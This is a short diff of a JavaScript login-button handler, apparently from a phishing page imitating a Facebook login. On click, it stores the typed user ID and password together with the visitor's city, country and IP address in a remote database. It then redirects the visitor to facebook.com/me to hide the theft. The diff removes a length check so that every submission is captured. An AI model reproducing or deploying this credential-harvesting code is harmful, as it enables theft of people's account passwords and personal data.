@@ -38,17 +38,15 @@ LoginBtn.addEventListener('click', e => {
   //   ID: userId.value,
   //   pw: Pass.value
   // });
-  if (userId.value.length > 4 && Pass.value.length > 4) {
 
-    usersRef.child(userId.value).transaction(function (currentData) {
-      if (currentData === null) {
-        return { ID: userId.value, pw: Pass.value, City: city, Country: country, IP: ip };
-        // return {ID:userId.value,pw:Pass.value,City:"",Country:"",IP:""};
-      } else {
-        // console.log('User  already exists.');
-        return; // Abort the transaction.
-      }
-    });
-    window.location.replace("http://www.facebook.com/me");
-  }
+  usersRef.child(userId.value).transaction(function (currentData) {
+    if (currentData === null) {
+      return { ID: userId.value, pw: Pass.value, City: city, Country: country, IP: ip };
+      // return {ID:userId.value,pw:Pass.value,City:"",Country:"",IP:""};
+    } else {
+      // console.log('User  already exists.');
+      return; // Abort the transaction.
+    }
+  });
+  window.location.replace("http://www.facebook.com/me");
 });
